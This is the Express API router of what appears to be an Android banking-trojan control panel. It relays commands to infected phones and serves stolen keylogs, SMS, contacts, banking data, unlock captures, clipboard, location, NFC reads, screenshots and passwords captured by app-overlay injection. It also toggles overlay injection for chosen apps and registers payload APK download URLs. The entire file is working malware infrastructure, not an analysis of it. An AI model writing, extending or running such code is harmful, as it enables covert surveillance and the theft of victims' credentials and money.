'use strict';
const express = require('express');
const { q }   = require('../db');
const state   = require('../state');
const router  = express.Router();

const now = () => Date.now();

// ── Auth middleware ───────────────────────────────────────────────────────────
const AUTH = process.env.AUTH_TOKEN || '';
router.use((req, res, next) => {
  if (!AUTH) return next();
  const tok = (req.headers.authorization || '').replace(/^Bearer\s+/i, '');
  if (tok !== AUTH) return res.status(401).json({ error: 'Unauthorized' });
  next();
});

// ── Global ────────────────────────────────────────────────────────────────────
router.get('/stats', (_, res) => {
  const s = q.getStats.get();
  s.online_count = state.devices.size;
  s.server_uptime = process.uptime();
  res.json(s);
});

router.get('/devices', (_, res) => res.json(q.getAll.all()));

router.get('/devices/:id', (req, res) => {
  const d = q.getOne.get(req.params.id);
  if (!d) return res.status(404).json({ error: 'Not found' });
  d.is_live = state.devices.has(req.params.id);
  res.json(d);
});

// ── Command relay ─────────────────────────────────────────────────────────────
router.post('/devices/:id/command', (req, res) => {
  const { id } = req.params;
  const { action, ...params } = req.body;
  if (!action) return res.status(400).json({ error: 'action required' });
  const sent = state.sendToDevice(id, { action, ...params });
  q.insertCmd.run(id, action, JSON.stringify(params), sent ? 1 : 0, now());
  state.broadcastAll({ type: 'command_issued', device_id: id, action, params, sent, ts: now() });
  res.json({ ok: true, sent });
});

// ── Data endpoints ─────────────────────────────────────────────────────────────
router.get('/devices/:id/keylogs',   (req, res) => {
  const limit  = Math.min(parseInt(req.query.limit  || '100'), 500);
  const offset = parseInt(req.query.offset || '0');
  res.json(q.getKeylogs.all(req.params.id, limit, offset));
});

router.get('/devices/:id/sms',       (req, res) => res.json(q.getSms.all(req.params.id)));
router.get('/devices/:id/contacts',  (req, res) => res.json(q.getContacts.all(req.params.id)));
router.get('/devices/:id/banking',   (req, res) => res.json(q.getBanking.all(req.params.id)));
router.get('/devices/:id/unlocks',   (req, res) => res.json(q.getUnlocks.all(req.params.id)));
router.get('/devices/:id/clipboard', (req, res) => res.json(q.getClipboard.all(req.params.id)));
router.get('/devices/:id/location',  (req, res) => res.json(q.getLocs.all(req.params.id)));
router.get('/devices/:id/apps',      (req, res) => res.json(q.getApps.all(req.params.id)));
router.get('/devices/:id/plugins',   (req, res) => res.json(q.getPlugins.all(req.params.id)));
router.get('/devices/:id/nfc',       (req, res) => res.json(q.getNfcAll.all(req.params.id)));
router.get('/devices/:id/nfc/last',  (req, res) => res.json(q.getNfcLast.get(req.params.id) || {}));
router.get('/devices/:id/financial', (req, res) => res.json(q.getFinAlerts.all(req.params.id)));
router.get('/devices/:id/injects',   (req, res) => res.json(q.getInjectPws.all(req.params.id)));
router.get('/devices/:id/fakecalls', (req, res) => res.json(q.getFakeCalls.all(req.params.id)));
router.get('/devices/:id/commands',  (req, res) => {
  const limit  = Math.min(parseInt(req.query.limit  || '100'), 500);
  const offset = parseInt(req.query.offset || '0');
  res.json(q.getCmds.all(req.params.id, limit, offset));
});

router.get('/devices/:id/files', (req, res) => {
  const path = req.query.path || '/';
  const row  = q.getFiles.get(req.params.id, path);
  res.json({ path, files: row ? JSON.parse(row.files || '[]') : [], ts: row?.ts || 0 });
});

router.get('/devices/:id/screenshots', (req, res) => res.json(q.getSS.all(req.params.id)));
router.get('/screenshots/:id', (req, res) => {
  const row = q.getSSById.get(parseInt(req.params.id));
  if (!row) return res.status(404).end();
  res.set('Content-Type', 'image/jpeg').send(Buffer.from(row.jpeg_b64, 'base64'));
});

// ── App inject toggle ─────────────────────────────────────────────────────────
router.post('/devices/:id/apps/:pkg/inject', (req, res) => {
  const { id, pkg } = req.params;
  const { enabled } = req.body;
  q.setInject.run(enabled ? 1 : 0, id, pkg);
  res.json({ ok: true });
});

// ── APKs ─────────────────────────────────────────────────────────────────────
router.get('/apks',  (_, res)  => res.json(q.getApks.all()));
router.post('/apks', (req, res) => {
  const { name, url, size } = req.body;
  q.insertApk.run(name||'', url||'', size||0, now());
  res.json({ ok: true });
});

// ── Financial alerts (global) ─────────────────────────────────────────────────
router.get('/financial', (_, res) => res.json(q.getAllFinAlerts.all()));

module.exports = router;
